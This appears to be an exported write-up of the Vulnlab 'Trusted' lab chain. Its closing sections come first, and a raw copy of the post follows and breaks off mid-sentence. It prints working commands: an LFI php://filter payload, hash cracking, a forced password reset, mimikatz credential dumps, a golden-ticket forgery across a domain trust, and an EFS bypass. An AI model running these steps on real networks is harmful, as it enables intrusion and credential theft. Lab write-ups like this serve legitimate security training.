domain object.\n* The `LAB` domain object SID.\n* The `TRUSTED` domain object SID for the `Enterprise Admins` group.\n\nIn order to get all three of those, we can use `mimikatz` to dump all of this information. Generally we'd want to try and get `mimikatz` past AV by utilizing a C2 or by process injection, however we won't need to do this since Defender is not enabled for this chain.\n\n# Golden Ticket to DC2\n\nThus, we can just drop `mimikatz` to disk and run it through the DC. https://github.com/ParrotSec/mimikatz\n\n```\nsliver > upload mimikatz.exe\n\nC:\\Users\\cpowers\\Documents> .\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /user:krbtgt /patch\" \"exit\"\n```\n\nThis gives us the `krbtgt` NTLM hash as well as the `LAB` domain SID.\nIn order to get the domain SID of the `TRUSTED` domain, we can use a built-in PowerShell cmdlet call `Get-ADGroup`.\n\n```\nPS C:\\Users\\cpowers\\Documents> Get-ADGroup -Filter {name -eq \"Enterprise Admins\"} -Server trusted.vl\n```\n\nTry not to do this through `Evil-WinRM`, I ran into some domain resolution issues and instead found better luck by running it through a reverse shell.\nWe now have the following information in order to build our Golden ticket.\n\n```\nNTLM Hash     - [...snip...]\nLAB SID       - S-1-5-21-2241985869-2159962460-1278545866\nTRUSTED SID   - S-1-5-21-3576695518-347000760-3731839591-519\nTarget Domain - trusted.vl\n\n> impacket-ticketer -nthash [...snip...] -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator\n```\n\nThis saves our Golden ticket as a new file called `Administrator.ccache`. We'll need to set this as a global variable on our Kali machine to use this to authenticate with Kerberos on the parent domain.\n\nOnce all of this is completed, we can use `psexec` to spawn a shell in this domain as the `Administrator` user. Reminder to use the `FQDN` (Fully Qualified Domain Name) of the parent domain controller, which is `trusteddc.trusted.vl`.\n\n```\n> export KRB5CCNAME=Administrator.ccache\n\n> impacket-psexec lab.trusted.vl/Administrator@trusteddc.trusted.vl -k -no-pass -target-ip 10.10.197.213\n```\n\nThis will open up a remote shell through `PsExec` on the `TRUSTEDDC` domain controller a `SYSTEM`, meaning we have completed this chain! Is what I hoped.\n\n![](/images/vulnlab/trusted-vl/q.jpg)\n\nYou'll notice that if you try to read the `root.txt`, we don't have the permissions to read it. Which if we think about it, doesn't make sense right? We're `SYSTEM` yet we don't have permissions to read the file.\n\nMy guess is that there are privileges that restricting us from accessing this file, meaning we need to use . To save some time (in the screenshot above as you'll notice), I used `mimikatz` to dump the Administrator hash and log-in with it through WinRM, however this STILL did not let us access the file.\n\n`C:\\Users\\Administrator\\Desktop> .\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /user:Administrator /patch\" \"exit\"\n`evil-winrm --ip 10.10.197.213 -u 'Administrator' -H '[...snip...]'` (with Administrator NTLM hash)\n\nIf you run `cipher /u /n` on the machine, you'll notice that the `root` flag is encrypted with `EFS`.\n\n![](/images/vulnlab/trusted-vl/r.jpg)\n\n# EFS Bypass as SYSTEM\n\nEFS (Encrypted File System) is a built-in Windows encryption feature that allows you to encrypt files or directories to prevent other users from opening them. This produces a certificate, which is required to be present in your current session in order to decrypt the encrypted file and read it.\n\nI also plan on creating a blog post based on `EFS` file decryption, as there's other bypasses aside from the one you'll see in a few moments.\n\nTo bypass this, we can use `runasCs` to circumvent the `EFS` encryption and read the flag as we  would normally.\nWe'll also need to change the `Administrator`'s user password in order to use `runasCs`, which is really simple now that we have access to command-line session as this user.\n\n`net user administrator \"password123@\"`\nhttps://github.com/antonioCoco/RunasCs\n\nNote that you can just use the PowerShell module that comes in this GitHub package, and just import it. Make sure to also upload this in a directory other than the `Administrator` directory, as this entire directory under the `EFS` encryption rule.\n\n```\nsliver > upload RunasCs/Invoke-RunasCs.ps1\n\n*Evil-WinRM* PS C:\\Users\\Public\\Desktop> Import-Module .\\Invoke-RunasCs.ps1; Invoke-RunasCs administrator \"password123@\" \"cmd.exe /c type C:\\users\\administrator\\desktop\\root.txt\"\n```\n\nThis will open the file and allow us to read the contents of the `root` flag. Thus, we have completed this chain!\n\n# Conclusion\n\nBig thanks to `r0BIT` for creating this chain, as it was extremely helpful in understanding Domain Dominance and EFS encryption. Helped a lot to help myself understand these topics and how to perform them mainly through Kali (and with some help through Mimikatz).\n\n# Resources\n\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\nhttps://www.exploit-db.com/exploits/10484\nhttps://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\nhttps://github.com/BishopFox/sliver\nhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\nhttps://github.com/ParrotSec/mimikatz\nhttps://github.com/antonioCoco/RunasCs\n","source":"_posts/trusted.md","raw":"---\ntitle: Trusted - Vulnlab\ndate: 2024-06-05 15:20:37\ntags: [vulnlab, Easy, CHAIN]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Windows'\ndescription: This chain was relatively fun, however it's a REALLY long one. That being said I still think it was a great learning experience, as I've learned how to perform pen-testing exploits that I've only heard brief snippets about (yet never done them practically). This machine includes exploits such as Local File Inclusion and DLL Hijacking, both of which are actually commonly seen vulnerabilities if not taken into consideration properly by developers.\ncover: /images/vulnlab/trusted-vl/trusted_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis chain was relatively fun, however it's a REALLY long one. That being said I still think it was a great learning experience, as I've learned how to perform pen-testing exploits that I've only heard brief snippets about (yet never done them practically). This machine includes exploits such as Local File Inclusion and DLL Hijacking, both of which are actually commonly seen vulnerabilities if not taken into consideration properly by developers.\n\n# Enumeration\n\nRunning our NMAP scans for host discovery for both machines.\n`sudo nmap (IP) -A -oN init_scan_(1/2).txt`\nAlso note, the IP addresses might change due to some breaks I take in between completing this chain.\n\n```\nNmap scan report for 10.10.155.37\nHost is up (0.10s latency).\nNot shown: 988 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:42:14Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=trusteddc.trusted.vl\n| Not valid before: 2024-04-30T15:22:54\n|_Not valid after:  2024-10-30T15:22:54\n| rdp-ntlm-info: \n|   Target_Name: TRUSTED\n|   NetBIOS_Domain_Name: TRUSTED\n|   NetBIOS_Computer_Name: TRUSTEDDC\n|   DNS_Domain_Name: trusted.vl\n|   DNS_Computer_Name: trusteddc.trusted.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-05-01T15:42:31+00:00\n|_ssl-date: 2024-05-01T15:42:40+00:00; +2s from scanner time.\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41302%PV=Y%DS=2%DC=T%G=Y%TM=66326\nOS:2F1%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS\nOS:=A)SEQ(SP=FF%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FF%GCD=1%ISR=\nOS:109%TI=RD%CI=I%II=I%TS=C)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D4NW8NNT\nOS:11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF\nOS:%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC=Y%Q=)T\nOS:1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%\nOS:O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80\nOS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q\nOS:=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A\nOS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R\nOS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-05-01T15:42:33\n|_  start_date: N/A\n|_clock-skew: mean: 1s, deviation: 0s, median: 1s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   105.46 ms 10.8.0.1\n2   105.84 ms 10.10.155.37\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 169.08 seconds\n\nNmap scan report for 10.10.155.38\nHost is up (0.10s latency).\nNot shown: 985 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)\n|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6\n| http-title: Welcome to XAMPP\n|_Requested resource was http://10.10.155.38/dashboard/\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:43:08Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)\n443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6\n| tls-alpn: \n|_  http/1.1\n| http-title: Welcome to XAMPP\n|_Requested resource was https://10.10.155.38/dashboard/\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB\n| mysql-info: \n|   Protocol: 10\n|   Version: 5.5.5-10.4.24-MariaDB\n|   Thread ID: 9\n|   Capabilities flags: 63486\n|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, InteractiveClient, SupportsTransactions, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins\n|   Status: Autocommit\n|   Salt: n;xn=$:7D2kEU_Z'SJ[i\n|_  Auth Plugin Name: mysql_native_password\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2024-05-01T15:43:35+00:00; +2s from scanner time.\n| ssl-cert: Subject: commonName=labdc.lab.trusted.vl\n| Not valid before: 2024-04-30T15:22:56\n|_Not valid after:  2024-10-30T15:22:56\n| rdp-ntlm-info: \n|   Target_Name: LAB\n|   NetBIOS_Domain_Name: LAB\n|   NetBIOS_Computer_Name: LABDC\n|   DNS_Domain_Name: lab.trusted.vl\n|   DNS_Computer_Name: labdc.lab.trusted.vl\n|   DNS_Tree_Name: trusted.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-05-01T15:43:26+00:00\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41334%PV=Y%DS=2%DC=T%G=Y%TM=66326\nOS:329%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%T\nOS:S=A)SEQ(SP=105%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=2%I\nOS:SR=105%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D\nOS:4NW8NNT11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%\nOS:W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC\nOS:=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=\nOS:S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF\nOS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=\nOS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=\nOS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-05-01T15:43:29\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 1s, deviation: 0s, median: 1s\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT       ADDRESS\n1   105.77 ms 10.8.0.1\n2   105.78 ms 10.10.155.38\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 42.35 seconds\n```\n\nAfter our initial NMAP scan, we can see there are two devices that are up. Both have LDAP and are a part of a domain. Both of these machines seem to be domain controllers, the first being `trusteddc.trusted.vl` and the second being `labdc.lab.trusted.vl`. On the second machine, it seems that we have port 80 open, so we'll look at that for the foothold of our attack path. Would like to note that the name of the chain is `Trusted` and we have two DCs, meaning we'll probably have to exploit some form of domain trust or delegation between the two DCs.\n\nUpon enumerating the website, we've seem to have found a landing page for XAMPP/Maria DB (MySQL). Would like to note that port 3306 `MySQL` is open on this machine.\n`gobuster dir -u http://10.10.155.38 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`\n\n```\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/img                  (Status: 301) [Size: 334] [--> http://10.10.155.38/img/]\n/dev                  (Status: 301) [Size: 334] [--> http://10.10.155.38/dev/]\n/examples             (Status: 503) [Size: 401]\n/licenses             (Status: 403) [Size: 420]\n/dashboard            (Status: 301) [Size: 340] [--> http://10.10.155.38/dashboard/]\n/%20                  (Status: 403) [Size: 301]\n/IMG                  (Status: 301) [Size: 334] [--> http://10.10.155.38/IMG/]\n/*checkout*           (Status: 403) [Size: 301]\n/Img                  (Status: 301) [Size: 334] [--> http://10.10.155.38/Img/]\n/phpmyadmin           (Status: 403) [Size: 301]\n/webalizer            (Status: 403) [Size: 301]\n/*docroot*            (Status: 403) [Size: 301]\n/*                    (Status: 403) [Size: 301]\n/con                  (Status: 403) [Size: 301]\n/Dashboard            (Status: 301) [Size: 340] [--> http://10.10.155.38/Dashboard/]\n```\n\nThe `dev` directory seems to be relatively interesting, as I don't commonly see these on default Apache websites. Navigating to it seems to direct us to a website titled `Manes Winchester Family Law Firm`, with directories `Home`, `About`, and `Contact`. Not only that, but it seems that we immediately see a message on the bottom of the `Home` page from one of the web developers.\n\n![](/images/vulnlab/trusted-vl/b.jpg)\n\nThis gives me confidence in assuming that with all we know, the attack path is some form of SQL vulnerability (could be SQL injection or by exploiting the `mysql_native_password` authentication plugin). Let's try to look around the website some more and see if we can find any SQL vulnerabilities, I'll enumerate a bit and see what I can find.\n\nLet's run a `gobuster` scan against `/dev` to see if we can find this database connection.\n`gobuster dir -u http://10.10.155.38/dev -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x 'php'`\n\n```\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 341] [--> http://10.10.155.38/dev/images/]\n/Images               (Status: 301) [Size: 341] [--> http://10.10.155.38/dev/Images/]\n/css                  (Status: 301) [Size: 338] [--> http://10.10.155.38/dev/css/]\n/db.php               (Status: 200) [Size: 22]\n/IMAGES               (Status: 301) [Size: 341] [--> http://10.10.155.38/dev/IMAGES/]\n/%20                  (Status: 403) [Size: 301]\n/*checkout*           (Status: 403) [Size: 301]\n/*checkout*.php       (Status: 403) [Size: 301]\n/CSS                  (Status: 301) [Size: 338] [--> http://10.10.155.38/dev/CSS/]\n/*docroot*            (Status: 403) [Size: 301]\n/*docroot*.php        (Status: 403) [Size: 301]\n/DB.php               (Status: 200) [Size: 22]\n```\n\n# PHP SQLi\n\nUsually whenever you look around for SQL Injection, you're mainly looking for a parameter to inject content into, such as `name` or `id`. This was not the case for us, as `db.php` did not have any other parameters that we can place anything into. The only result we receive from accessing `db.php` is a `Connection successful` message, however there's pretty much nothing we can do with it.\n\n![](/images/vulnlab/trusted-vl/c.jpg)\n\nThat being said, there is one webpage that does have some parameter, and it seemed to be the only parameter amongst all of the webpages I could find.\n`http://10.10.162.38/dev/index.html?view=contact.html`\n\nThis was the contact page from the landing website directory in `/dev`. Since we have a `?view` parameter, there's an opportunity to exploit LFI.\n\nTo those who are not aware, LFI (Local File Inclusion) is a web-application vulnerability that allows us to traverse local files on the victim's machine through URL or website parameters. We can then dump the contents of any file we have access to straight onto the webpage.\n\nLet's test this out on that `contact.html` page we were referring to earlier. We'll try to access `C:\\Users` to determine if we can see the list of all users we can log onto. (Remember, this is a Windows machine, otherwise on Linux we would just dump `/etc/passwd`.)\n`http://10.10.162.38/dev/index.html?view=C:\\Users`\n\n![](/images/vulnlab/trusted-vl/d.jpg)\n\nIt seems that we don't have any permissions to view it, however we did get some vital information from this error. The local path for the website seems to be `C:\\xampp\\htdocs\\dev`. In that case, let's try to access that `db.php` page from here and view it's contents.\n`http://10.10.162.38/dev/index.html?view=C:\\xampp\\htdocs\\dev\\db.php`\n\n![](/images/vulnlab/trusted-vl/e.jpg)\n\n# SQLi PHP Filter Bypass\n\nIt seems like it works! With that in mind, we can dump all the contents from this specific file by encoding it the base64 using `php://filter`. Note that we can use a `php://filter` to query database results, in this case we are querying the contents of __THIS SPECIFIC FILE__. It was a bit confusing for me to understand at first, however since there is a database connection occurring from this specific file we can assume that the credentials are being matched somewhere in `db.php`'s code.\n\n`http://10.10.162.38/dev/index.html?view=php://filter/convert.base64-encode/resource=C:/xampp/htdocs/dev/db.php`\nSo to recap, we're doing the following in this URL:\n1. Use the view parameter to start the LFI statement.\n2. Use a PHP filter to convert all contents that we dump to base64.\n3. Using the parameter `resource` to say that we want to dump all contents of `db.php` to base64.\n\n![](/images/vulnlab/trusted-vl/f.jpg)\n\nLooks as though the contents were dumped to the website, meaning we can decode this and see the real contents of `db.php`.\n`PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkI[...snip...]Y29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=`\n\nFrom here, it's just a simple base64 decode in our terminal to find out the contents.\n```\necho \"PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=\" | base64 -d\n```\n\n```\n<?php \n$servername = \"localhost\";\n$username = \"root\";\n$password = \"[...snip...]\";\n\n$conn = mysqli_connect($servername, $username, $password);\n\nif (!$conn) {\n  die(\"Connection failed: \" . mysqli_connect_error());\n}\necho \"Connected successfully\";\n?>\n```\n\n# MySQL Enumeration\n\nIf you remember from earlier, our NMAP scan told us earlier that the `MySQL` service was public facing. We can attempt to authenticate to it using the credentials we have to see what else we may have access to.\n`mysql -h 10.10.162.38 -u 'root' -p`\n\nThis gives us access to the `MariaDB` database, to which we can look around for any credentials to the Active Directory instance.\nUpon some enumerating, I found some credentials in the `news` database.\n`select * from users;`\n\n```\n+----+------------+--------------+-----------+----------------------------------+\n| id | first_name | short_handle | last_name | password                         |\n+----+------------+--------------+-----------+----------------------------------+\n|  1 | Robert     | rsmith       | Smith     | [...snip...]                     |\n|  2 | Eric       | ewalters     | Walters   | [...snip...]                     |\n|  3 | Christine  | cpowers      | Powers    | [...snip...]                     |\n+----+------------+--------------+-----------+----------------------------------+\n```\n\nOriginally I had thought that these hashes were LM hashes, however upon testing them with `crackmapexec` and `hashcat auto-detect mode`, it seems that they may very well be another hashing algorithm. After a bit of testing with `jtr` it seems that this specific hashing algorithm is `Raw-MD5`\n`john rsmith.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5`\n\n```\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\n[...snip...]       (?)     \n1g 0:00:00:00 DONE (2024-05-02 01:41) 1.666g/s 18487Kp/s 18487Kc/s 18487KC/s IHav.One*Q..IHATESPIDERS\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed.\n```\n\nThis gives us the plaintext of `rsmith`'s password, which we can use to do dump a lot of other things around this specific domain controller.\n\nTesting the creds to these with CrackMapExec, we can see that these specific creds are valid to LDAP.\n`crackmapexec ldap 10.10.157.166 -u 'rsmith' -p '[...snip...]'`\n\n```\nSMB         10.10.157.166   445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.157.166   389    LABDC            [+] lab.trusted.vl\\rsmith:[...snip...]\n```\n\nNow that we have verified that `rsmith`'s creds are eligible to authenticate to LDAP, we can now use these same credentials to dump LDAP and identify all other domain objects.\n\n# Dumping LDAP\n\nNormally you'd be able to use `ldapdomaindump`, however I'm more used to using the Bloodhound-Python ingestor. I've also found that `ldapdomaindump` still does not work after remediating an error that you'll see pretty soon with the Python ingestor. Nonetheless I'd still like to include what the `ldapdomaindump` command would look like in this context.\n `ldapdomaindump -u LABDC\\\\'rsmith' -p '[...snip...]' ldap://10.10.157.166:389`\n`BloodHound.py/bloodhound.py -d 'trusted.vl' -u 'rsmith' -p [...snip...] -c all -ns 10.10.157.166 --zip`\nhttps://github.com/dirkjanm/BloodHound.py\n\nIt seems I've encountered an issue that I've never come into contact before. Upon running this command, you'll find that a nameserver error occurs based on an invalid query.\n`dns.resolver.NoNameservers: All nameservers failed to answer the query _ldap._tcp.pdc._msdcs.trusted.vl. IN SRV: Server Do53:10.10.157.166@53 answered SERVFAIL`\n\nI couldn't find why this issue occurs, however my guess is that the domain `trusted.vl` is either rerouting or denying all DNS nameserver replies that come into contact with the domain.\nWe can circumvent this issue by using `dnschef`,  a DNS proxy that will allow us to bind all DNS requests back to localhost instead of making a direct request to the DNS server.\n\nNote that you'll need two terminals to do this, one for initializing the DNS proxy and another for actually utilizing the ingestor.\n`dnschef --fakeip 10.10.157.166`\n`BloodHound.py/bloodhound.py -d 'lab.trusted.vl' -u 'rsmith' -p '[...snip...]' -c all -ns 127.0.0.1 --zip -dc labdc.lab.trusted.vl`\n\nThis is a potential workaround when coming into contact with DNS nameserver resolution errors when coming into contact with errors using the ingestor. While this may not work every time, it is still a method to give a shot.\n\nAfter receiving the compressed domain dump file, we can import it to Bloodhound and begin enumerating what `rsmith` can do.\n\nIn case you are unfamiliar with how to set up Bloodhound, here's a beginner walkthrough to do before the next step in this walkthrough. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\n\nAfter uploading the zip folder to Bloodhound, let's search up the domain object for `rsmith@lab.trusted.vl`. After selecting `Node Info`, we can see that `rsmith` has an1 outbound object control.\n\n![](/images/vulnlab/trusted-vl/g.jpg)\n\nIt seems that `rsmith` has `ForceChangePassword` rights onto `ewalters`, one of the other users that we dumped in our enumeration of the SQL instance previously. This outbound object control means exactly what you think it might mean - `rsmith` has the ability to force a password reset on `ewalters`, meaning we can do exactly that.\n\n# ForceChangePassword Object Control\n\nTo reset a user's password with this outbound object control, you can use tools such as `rpcclient` or `bloodyad`. I'm more used to using `bloodyad` so that's what we'll use in our situation. `bloodyAD/bloodyAD.py -u 'rsmith' -p '[...snip...]' -d 'lab.trusted.vl' --host 10.10.157.166 set password 'ewalters' 'password123@'`\n\nI changed `ewalters` password to something simple, however you can make it whatever you'd like. If successful, you'll receive a small `[+] Password has changed successfully!` message. This indicates that the password for `ewalters` has been changed amongst the entire domain.\n\nWe can now verify that the changes have been made with CrackMapExec. I've decided to use a one-liner with all of the CME services separated by a newline in a text file.\n`for line in $(cat cme_services.txt); do crackmapexec $line 10.10.157.166 -u 'ewalters' -p 'password123@'; done`\n\nYou'll notice that while RDP is valid (despite Bloodhound telling us that this user has RDP privileges, we can authenticate to WinRM.\n\n```\nSMB         10.10.157.166   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)\nHTTP        10.10.157.166   5985   LABDC            [*] http://10.10.157.166:5985/wsman\nWINRM       10.10.157.166   5985   LABDC            [+] lab.trusted.vl\\ewalters:password123@ (Pwn3d!)\n```\n\nSo from here we'll use `evil-winrm` to authenticate through WinRM with the `ewalters` user.\n\n`evil-winrm --ip 10.10.157.166 -u 'ewalters' -p 'password123@'`\n\n![](/images/vulnlab/trusted-vl/h.jpg)\n\n# DC1 Host Reconnaissance\n\nWhile normally we'd get the user flag at this point, `r0BIT` messed around with us and left a fake flag in `ewalters` Desktop directory.\n\n```\n*Evil-WinRM* PS C:\\Users\\ewalters\\Documents> cd ../Desktop\n*Evil-WinRM* PS C:\\Users\\ewalters\\Desktop> ls\n\n\n    Directory: C:\\Users\\ewalters\\Desktop\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website\n-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website\n-a----         9/18/2022   9:12 PM         202492 robitcat.jpg\n-a----         9/18/2022   9:11 PM            108 User.txt\n\n\nc*Evil-WinRM* PS C:\\Users\\ewalters\\Desktop> cat User.txt\n|\\---/|\n| o_o |\n \\_^_/\nThese are not the flags you're looking for.\nTake :robitcat: as compensation :).\n```\n\nIt looks like we'll need to look around a little more and escalate to another user to get the user flag. My guess is that we'll need to get to `cpowers`, who was the third and final user that we were able dumped from the SQL database.\n\nWhile I was looking around the filesystem for any leads, I stumbled across a folder in the `C:\\` directory titled, `AVTest`. This isn't a folder that's here regularly so let's take a look into it a little more.\n\n```\n*Evil-WinRM* PS C:\\AVTest> ls\n\n\n    Directory: C:\\AVTest\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         9/14/2022   4:46 PM        4870584 KasperskyRemovalTool.exe\n-a----         9/14/2022   7:05 PM            235 readme.txt\n\n\n*Evil-WinRM* PS C:\\AVTest> cat readme.txt\nSince none of the AV Tools we tried here in the lab satisfied our needs it's time to clean them up.\nI asked Christine to run them a few times, just to be sure.\n\nLet's just hope we don't have to set this lab up again because of this.\n```\n\nThe `readme.txt` tells us that the AV tools are being disposed of, however it seems that the `cpowers` user will be running this executable a few more times before the dispose is initiated.\n\nIn a regular red-teaming context, we need 